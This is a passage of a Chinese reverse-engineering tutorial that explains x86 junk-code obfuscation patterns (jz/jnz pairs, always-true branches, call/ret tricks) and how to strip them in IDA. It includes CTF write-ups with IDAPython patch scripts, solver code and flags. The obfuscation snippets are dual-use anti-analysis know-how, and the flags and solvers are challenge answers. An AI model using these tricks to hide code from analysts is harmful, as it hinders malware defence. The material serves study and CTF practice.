src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721353962580-686cdcb7-ccd7-49e9-8f4a-0f72693996f5-294562.png" alt="1721353962580-686cdcb7-ccd7-49e9-8f4a-0f72693996f5.png"></p><p>也可以使用一个idapython脚本添加一个快捷键，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">from</span> idaapi import *<br><span class="hljs-keyword">from</span> idc import *<br>def <span class="hljs-title function_ invoke__">nopIt</span>():<br>        start = <span class="hljs-title function_ invoke__">get_screen_ea</span>()<br>        <span class="hljs-title function_ invoke__">patch_byte</span>(start,<span class="hljs-number">0x90</span>)<br>        <span class="hljs-title function_ invoke__">refresh_idaview_anyway</span>()<br> <br><span class="hljs-title function_ invoke__">add_hotkey</span>(<span class="hljs-string">&quot;ctrl-N&quot;</span>,nopIt)<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721355270856-35c64945-085f-467d-82c9-447cde006700-058394.png" alt="1721355270856-35c64945-085f-467d-82c9-447cde006700.png"></p><p><font style="color:rgb(77, 77, 77);">idapython在File - Script commannd…处 也可以</font><font style="color:#DF2A3F;">Shift+F2</font><font style="color:rgb(77, 77, 77);">快捷键打开</font></p><h2 id="3-jz和jnz条件跳转-jz为1跳转-jnz为0跳转"><a href="#3-jz和jnz条件跳转-jz为1跳转-jnz为0跳转" class="headerlink" title="3.jz和jnz条件跳转(jz为1跳转,jnz为0跳转)"></a>3.jz和jnz条件跳转(jz为1跳转,jnz为0跳转)</h2><p>利用jz和jnz的互补条件跳转指令来代替jmp。骗过OD</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">_asm&#123;<br>    jz label1<br>    jnz label1<br>    db junkcode<br>label1:    <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721354098458-f42c0e73-1730-44fc-a918-2ca8d5cb625b-267781.png" alt="1721354098458-f42c0e73-1730-44fc-a918-2ca8d5cb625b.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">__asm &#123;<br>        jz Label;<br>                jnz Label;<br>                _emit <span class="hljs-number">0xC7</span>;<br>Label:<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721354121403-d10f9e67-3634-4188-b8e9-e87e17e47bca-303448.png" alt="1721354121403-d10f9e67-3634-4188-b8e9-e87e17e47bca.png"></p><p>这种混淆去除方式也很简单，特征也很明显，因为是近跳转，所以ida分析的时候会分析出jz或者jnz会跳转几个字节，这个时候我们就可得到垃圾数据的长度，将该长度字节的数据全部nop掉即可解混淆。</p><h2 id="4-永真条件跳转"><a href="#4-永真条件跳转" class="headerlink" title="4.永真条件跳转"></a>4.永真条件跳转</h2><p>通过设置永真或者永假的，导致程序一定会执行，由于ida反汇编会优先反汇编接下去的部分（false分支）。也可以调用某些函数会返回确定值，来达到构造永真或永假条件。ida和OD都被骗过去了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php">__asm&#123;<br>    push ebx<br>    <span class="hljs-keyword">xor</span> ebx,ebx<br>    test ebx,ebx<br>    jnz label1<br>    jz label2<br>label1:<br>    _emit junkcode<br>label2:<br>   pop ebx<span class="hljs-comment">//需要恢复ebx寄存器    </span><br>&#125;<br> <br>__asm&#123;<br>        clc<br>        jnz label1:<br>        _emit junkcode<br>label1:<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721354481334-ab9e26c5-da68-49df-bd2a-bb462bf71f83-379402.png" alt="1721354481334-ab9e26c5-da68-49df-bd2a-bb462bf71f83.png"></p><p>确保一个支路永远跳转</p><p>在另一个不跳转的支路填充垃圾代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">__asm &#123;<br>         push ebx;<br>         <span class="hljs-keyword">xor</span> ebx, ebx;<br>         test ebx, ebx;<br>         jnz LABEL7;<br>         jz    LABEL8;<br>     LABEL7:<br>         _emit <span class="hljs-number">0xC7</span>;<br>     LABEL8:<br>         pop ebx;<br>     &#125;<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721354674154-02aa9af9-394c-4f26-874d-96e9cab3a7f4-732421.png" alt="1721354674154-02aa9af9-394c-4f26-874d-96e9cab3a7f4.png"></p><p>先对ebx进行xor之后，再进行test比较，zf标志位肯定为1，就肯定执行jz LABEL8，也就是说中间0xC7永远不会执行。</p><p>解混淆的时候也需要稍加注意，需要分析一下哪里是哪里是真正会跳到的位置，然后将垃圾数据nop掉，本质上和前面几种没什么不同。</p><h2 id="5-call-ret构造花指令"><a href="#5-call-ret构造花指令" class="headerlink" title="5.call&amp;ret构造花指令"></a>5.call&amp;ret构造花指令</h2><p>这里利用call和ret，在函数中修改返回地址，达到跳过thunkcode到正常流程的目的。可以干扰ida的正常识别</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">__asm&#123;<br>    call label1<br>    _emit junkcode<br>label1:<br>    add dword ptr ss:[esp],<span class="hljs-number">8</span><span class="hljs-comment">//具体增加多少根据调试来</span><br>    ret<br>    _emit junkcode<br>&#125;<br> <br>call指令：将下一条指令地址压入栈，再跳转执行<br>ret指令：将保存的地址取出，跳转执行<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721354747698-fce4acab-e2a3-4820-ad8d-c3c4b0bc8207-319994.png" alt="1721354747698-fce4acab-e2a3-4820-ad8d-c3c4b0bc8207.png"></p><h2 id="6-汇编指令共用opcode"><a href="#6-汇编指令共用opcode" class="headerlink" title="6.汇编指令共用opcode"></a>6.汇编指令共用opcode</h2><p>jmp的条指令是inc eax的第一个字节，inc eax和dec eax抵消影响。这种共用opcode确实比较麻烦</p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721355060769-14200fc6-a5ac-4cb2-a762-0047ddc96c46-793398.png" alt="1721355060769-14200fc6-a5ac-4cb2-a762-0047ddc96c46.png"></p><h1 id="三、清除花指令"><a href="#三、清除花指令" class="headerlink" title="三、清除花指令"></a>三、清除花指令</h1><h2 id="手动清除"><a href="#手动清除" class="headerlink" title="手动清除"></a>手动清除</h2><p>找到所有的花指令，重新设置数据和代码地址。或者将花指令设置为nop（0x90）</p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721355096586-1256c005-1aa5-4818-8ab2-f5b54b6524f5-280846.png" alt="1721355096586-1256c005-1aa5-4818-8ab2-f5b54b6524f5.png"></p><p>在0x401051设置为数据类型（快捷键D）,在0x401052设置为代码类型（快捷键C）</p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721355107870-87ecf08e-d247-4ba0-aea0-be643e603ac5-434260.png" alt="1721355107870-87ecf08e-d247-4ba0-aea0-be643e603ac5.png"></p><p>这里用一个ida python脚本添加ALT+N快捷键来将指令的第一个字节设置为NOP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">from</span> idaapi import *<br><span class="hljs-keyword">from</span> idc import *<br> <br>def <span class="hljs-title function_ invoke__">nopIt</span>():<br>        start = <span class="hljs-title function_ invoke__">get_screen_ea</span>()<br>        <span class="hljs-title function_ invoke__">patch_byte</span>(start,<span class="hljs-number">0x90</span>)<br>        <span class="hljs-title function_ invoke__">refresh_idaview_anyway</span>()<br> <br><span class="hljs-title function_ invoke__">add_hotkey</span>(<span class="hljs-string">&quot;alt-N&quot;</span>,nopIt)<br></code></pre></td></tr></table></figure><p>参考文章                   </p><p>原文链接：<a href="https://blog.csdn.net/Daphneohh/article/details/139422749">https://blog.csdn.net/Daphneohh/article/details/139422749</a></p><h1 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h1><p>P  保存汇编代码</p><p>F5 反编译</p><p>shift+2  编写exp</p><h1 id="例题jmp"><a href="#例题jmp" class="headerlink" title="例题jmp"></a>例题jmp</h1><h2 id="1、nssctf-jump-by-jump"><a href="#1、nssctf-jump-by-jump" class="headerlink" title="1、nssctf jump_by_jump"></a>1、nssctf jump_by_jump</h2><p>先查壳，放32位ida</p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721355605284-25d82ffd-8ff4-4e1b-9b9b-7a7a5024de5d-532923.png" alt="1721355605284-25d82ffd-8ff4-4e1b-9b9b-7a7a5024de5d.png"></p><p>看汇编</p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721355741298-94b3219c-21be-4a97-81c0-bee09fa2c39e-085486.png" alt="1721355741298-94b3219c-21be-4a97-81c0-bee09fa2c39e.png"></p><p><font style="color:rgb(77, 77, 77);">打开Options-General</font></p><p><font style="color:rgb(77, 77, 77);">可以把stack pointer打开，</font></p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721356426237-2f6effe2-8f8e-4db0-bf84-c8afa8fbb83a-906423.png" alt="1721356426237-2f6effe2-8f8e-4db0-bf84-c8afa8fbb83a.png"></p><p><font style="color:rgb(77, 77, 77);">是jz和jnz构造的互补跳转花指令，还是先option设置打开opcode bytes的显示；将e8改为90（nop）</font></p><p><font style="color:rgb(77, 77, 77);">选中这一行，Edit-Patch program-Change bytes</font></p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721356324223-94bce652-480d-4b16-8f5f-80d2ba8a3147-134055.png" alt="1721356324223-94bce652-480d-4b16-8f5f-80d2ba8a3147.png"></p><p><font style="color:rgb(77, 77, 77);">把第一个e9改为90就好，接着对main函数用P重新定义下，再F5反编译就</font><font style="color:rgb(77, 77, 77);">🆗</font><font style="color:rgb(77, 77, 77);">了</font></p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721356019280-8e4fca2b-6f4c-4e79-a40a-e863aab4c0cd-297254.png" alt="1721356019280-8e4fca2b-6f4c-4e79-a40a-e863aab4c0cd.png"></p><p><font style="color:rgb(77, 77, 77);"></font></p><p><font style="color:rgb(77, 77, 77);">再点击黄色部分，一步一步按C转换为代码，直到没有黄色为止。</font></p><p><font style="color:rgb(77, 77, 77);">然后对main函数用p重定义一下</font></p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721356369534-3028e209-b08b-4300-ba89-db9d6d0733b5-982024.png" alt="1721356369534-3028e209-b08b-4300-ba89-db9d6d0733b5.png"></p><p>然后f5反编译就可以得到flag了</p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721356564797-e41d12c2-cdd7-4da6-b1ed-7694a2ec6a34-600452.png" alt="1721356564797-e41d12c2-cdd7-4da6-b1ed-7694a2ec6a34.png"></p><h2 id="2、jump-by-jump-reverse"><a href="#2、jump-by-jump-reverse" class="headerlink" title="2、jump_by_jump_reverse"></a>2、jump_by_jump_reverse</h2><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721356763308-288ef2d5-939b-4f35-bbe9-0be31867e327-422608.png" alt="1721356763308-288ef2d5-939b-4f35-bbe9-0be31867e327.png"></p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721356811914-ba4008be-9c4b-4160-89f7-24f755182229-756080.png" alt="1721356811914-ba4008be-9c4b-4160-89f7-24f755182229.png"></p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721356848763-4ccf8251-7da8-4ea2-9795-f2cea0eb5329-357097.png" alt="1721356848763-4ccf8251-7da8-4ea2-9795-f2cea0eb5329.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plain">def is_right(c):<br>    return 32 &lt;= ord(c) &lt;= 125<br><br>def reverse_transformation():<br>    Str1 = list(&quot;~4G~M:=WV7iX,zlViGmu4?hJ0H-Q*&quot;)<br><br>    for i in range(28, -1, -1):<br>        original_val = (ord(Str1[i]) - 32) - ord(Str1[(i * i + 123) % 21])<br>        while original_val &lt; 32:<br>            original_val += 96<br>        Str1[i] = chr(original_val)<br><br>    return &#x27;&#x27;.join(Str1)<br><br>if __name__ == &#x27;__main__&#x27;:<br>    original_str = reverse_transformation()<br>    print(&quot;原始输入字符串：&quot;, original_str)<br></code></pre></td></tr></table></figure><h2 id="3、wordy"><a href="#3、wordy" class="headerlink" title="3、wordy"></a>3、wordy</h2><p> <font style="color:#000000;">IDA打开存在大量jmp跳转，导致程序无法正常编译，尝试将跳转nop掉</font></p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721359662160-54d1ff47-1314-4eaa-af43-2f0f8ded77cd-960523.png" alt="1721359662160-54d1ff47-1314-4eaa-af43-2f0f8ded77cd.png"></p><p>shift+F2添加exp</p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721359798003-c8edb38f-e2a8-4d14-8241-d040fac187fd-115637.png" alt="1721359798003-c8edb38f-e2a8-4d14-8241-d040fac187fd.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain"># 利用idapython脚本解决重复工作<br>startaddr = 0x1135<br>endaddr = 0x3100<br><br>for i in range(startaddr,endaddr):<br>    if get_wide_byte(i) == 0xEB:<br>        if get_wide_byte(i+1) == 0xFF:<br>            patch_byte(i,0x90)<br>            print(&quot;[+] Addr &#123;&#125; is patched&quot;.format(hex(i)))<br></code></pre></td></tr></table></figure><p>然后对main P一下，F5编译</p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721359814971-53d2e435-aa8f-4ac6-b124-150df674f9ef-767192.png" alt="1721359814971-53d2e435-aa8f-4ac6-b124-150df674f9ef.png"></p><p>如果没有脚本，建议空格去图里面看比较好</p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721359955286-133ae6ef-5ae6-4f83-bc3a-61f7e2b9ba8b-078792.png" alt="1721359955286-133ae6ef-5ae6-4f83-bc3a-61f7e2b9ba8b.png"></p><p>这里找到flag</p><h3 id="附上大佬脚本"><a href="#附上大佬脚本" class="headerlink" title="附上大佬脚本"></a>附上大佬脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plain">import idc<br>import ida_bytes<br>import ida_ida<br>print(&quot;-----&quot;)<br>hexStr=&quot;EB FF C0 BF ?? 00 00 00 E8&quot;<br>bMask = bytes.fromhex(hexStr.replace(&#x27;00&#x27;, &#x27;01&#x27;).replace(&#x27;??&#x27;, &#x27;00&#x27;))<br>bPattern = bytes.fromhex(hexStr.replace(&#x27;??&#x27;, &#x27;00&#x27;))<br>signs=ida_bytes.BIN_SEARCH_FORWARD| ida_bytes.BIN_SEARCH_NOBREAK| ida_byte<br>s.BIN_SEARCH_NOSHOW<br>print(bMask,bPattern)<br>begin_addr=0x1135<br>end_addr=0x3100<br>s=&quot;&quot;<br>while begin_addr&lt;end_addr:<br>    ea=ida_bytes.bin_search(begin_addr,end_addr,bPattern,bMask,1,signs)<br>    if ea == ida_idaapi.BADADDR:<br>        break<br>    else:<br>        s+=chr(idc.get_wide_byte(ea+4))<br>        begin_addr=ea+8<br>print(s)<br></code></pre></td></tr></table></figure><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p><font style="color:#000000;">打</font><font style="color:#000000;background-color:#FFFFFF;">开16进制转存储视图，可以看到flag（hex_dump）</font></p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721360264704-c3d44e79-5175-4a8e-b150-d96fc7b54eb7-421232.png" alt="1721360264704-c3d44e79-5175-4a8e-b150-d96fc7b54eb7.png"></p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721359190406-429ef909-dda6-4ff2-9d88-25a284922613-361947.png" alt="1721359190406-429ef909-dda6-4ff2-9d88-25a284922613.png"></p><p>GFCTF{u_are2wordy}</p><h2 id="4、e-sy-flower"><a href="#4、e-sy-flower" class="headerlink" title="4、e@sy_flower"></a>4、<font style="color:#000000;">e@sy_flower</font></h2><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721360442073-d4f7bbef-ddee-4624-bd6f-2351ab5e19a8-074929.png" alt="1721360442073-d4f7bbef-ddee-4624-bd6f-2351ab5e19a8.png"></p><p>放入32位ida</p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721360480658-9d95cf9c-4e83-4973-82d7-5d1954e89698-551250.png" alt="1721360480658-9d95cf9c-4e83-4973-82d7-5d1954e89698.png"></p><p>将E9改成90，保存一下发编译即可</p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721362959271-e0d76b72-3677-4e17-b18e-dea313d5288d-526799.png" alt="1721362959271-e0d76b72-3677-4e17-b18e-dea313d5288d.png"></p><p>简单逆向一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plain">a = list(&#x27;c~scvdzKCEoDEZ[^roDICUMC&#x27;)<br><br># Step 1: XOR operation with 0x30<br>for i in range(len(a)):<br>    a[i] = chr(ord(a[i]) ^ 0x30)<br><br># 输出 XOR 处理后的字符串<br>print(&quot;After XOR operation:&quot;, &#x27;&#x27;.join(a))<br><br># Step 2: Swap adjacent characters<br>for i in range(len(a) // 2):<br>    tmp = a[i * 2]<br>    a[i * 2] = a[i * 2 + 1]<br>    a[i * 2 + 1] = tmp<br><br># 输出交换后的字符串<br>print(&quot;After swapping:&quot;, &#x27;&#x27;.join(a))<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">a=list(&#x27;c~scvdzKCEoDEZ[^roDICUMC&#x27;)<br>for i in range(len(a)):<br>    a[i]=chr(ord(a[i])^0x30)<br>print(a,end=&#x27;\n&#x27;)<br>for i in range(len(a)//2):<br>    tmp=a[i*2]<br>    a[i*2]=a[i*2+1]<br>    a[i*2+1]=tmp<br>print(&#x27;&#x27;.join(a))<br></code></pre></td></tr></table></figure><h2 id="5、chicken-soup"><a href="#5、chicken-soup" class="headerlink" title="5、chicken_soup"></a>5、chicken_soup</h2><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721372130642-283c8a47-f74e-419a-8a5f-63cbc3a6befb-981096.png" alt="1721372130642-283c8a47-f74e-419a-8a5f-63cbc3a6befb.png"></p><p>放入32位</p><p>看到两个对v4的加密函数</p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721372777406-b52a1d8f-eb7d-487a-8f0a-d5a254c5ee58-561194.png" alt="1721372777406-b52a1d8f-eb7d-487a-8f0a-d5a254c5ee58.png"></p><p>跟进去nop一下</p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721372760398-932abc00-ae72-44ca-974e-27026028e47a-750299.png" alt="1721372760398-932abc00-ae72-44ca-974e-27026028e47a.png"></p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721372964357-0f2792be-8142-4522-8da8-ca2d56c10451-483311.jpeg" alt="1721372964357-0f2792be-8142-4522-8da8-ca2d56c10451.jpeg"></p><p>按p创建函数，C一下黄色的汇编代码，然后F5反编译</p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721372955966-292f70aa-7788-4e37-8fdb-448b34cb5f8c-007929.png" alt="1721372955966-292f70aa-7788-4e37-8fdb-448b34cb5f8c.png"></p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721373162284-1d98a015-b513-484a-9ed3-d52c8b050fc4-824927.png" alt="1721373162284-1d98a015-b513-484a-9ed3-d52c8b050fc4.png"></p><p>找到比较数据源</p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721374849174-e01b2c7a-b742-4aa5-9116-fb83bc9ceaca-966927.png" alt="1721374849174-e01b2c7a-b742-4aa5-9116-fb83bc9ceaca.png"></p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721374886691-dd6b1c35-9f76-459e-8531-d1471ab69a8e-634909.png" alt="1721374886691-dd6b1c35-9f76-459e-8531-d1471ab69a8e.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#include&lt;stdio.h&gt;</span><br><span class="hljs-keyword">int</span> <span class="hljs-title function_ invoke__">main</span>()<br>&#123;<br>        unsigned char a1[] =<br>&#123;<br>        <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x7D</span>,<br>        <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0xCC</span>,<br>        <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x9D</span>,<br>        <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xD7</span><br>&#125;;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i&lt;<span class="hljs-number">38</span>;i++ )<br>        &#123;<br>                a1[i] = (<span class="hljs-number">16</span> * a1[i]) | (a1[i] &gt;&gt; <span class="hljs-number">4</span>);<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">36</span>;j&gt;<span class="hljs-number">0</span>;j--)&#123;<br>                a1[j]-=a1[j+<span class="hljs-number">1</span>];<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">38</span>;i++)<br>        &#123;<br>                <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,a1[i]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> &#125;<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1721373728364-cc4c9996-d851-4558-9e48-d105092417cf-437175.png" alt="1721373728364-cc4c9996-d851-4558-9e48-d105092417cf.png"></p><h1 id="例题ret-call-5"><a href="#例题ret-call-5" class="headerlink" title="例题ret call$5"></a>例题ret call$5</h1><h2 id="dirty-flower"><a href="#dirty-flower" class="headerlink" title="dirty_flower"></a>dirty_flower</h2><p>第一个异常,call $+5,看完以后，发现前面的push eax，，后面的retn, 跟着pop eax，从push eax 到pop eax，直接改成nop ,然后回到上面的main ,用U改成未定义，在用P重新生成就可以了</p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1728725049411-8a6682df-5600-4cc4-bf9c-cc7a753f6403-189363.png" alt="1728725049411-8a6682df-5600-4cc4-bf9c-cc7a753f6403.png"></p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1728725119217-462f7118-0bcd-4bf2-bc52-7902234bd15e-099593.png" alt="1728725119217-462f7118-0bcd-4bf2-bc52-7902234bd15e.png"></p><p>就可以反编译了，</p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1728725130410-d178243e-f9e9-49ab-b740-ba3f3ff21781-253853.png" alt="1728725130410-d178243e-f9e9-49ab-b740-ba3f3ff21781.png"></p><p>下面这个函数也是一样的，nop后去上面找到该函数，u，p</p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1728725165787-5f55b86b-a466-4f52-908e-c35615cb1c28-763908.png" alt="1728725165787-5f55b86b-a466-4f52-908e-c35615cb1c28.png"></p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1728725243684-adc4b1c5-c0a1-4731-b1e0-9b062f1a23ff-572061.png" alt="1728725243684-adc4b1c5-c0a1-4731-b1e0-9b062f1a23ff.png"></p><p><img src="/./img/49277317_A-BcuOM6Cd0eIUZm/1728724936661-ce5187ca-c911-49b7-8bff-b440ebc686f2-518411.png" alt="1728724936661-ce5187ca-c911-49b7-8bff-b440ebc686f2.png">exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs plain">#include&lt;stdio.h&gt;<br>#include&lt;string.h&gt;<br>int main()<br>&#123;<br>    char s[]=&quot;dirty_flower&quot;;<br>    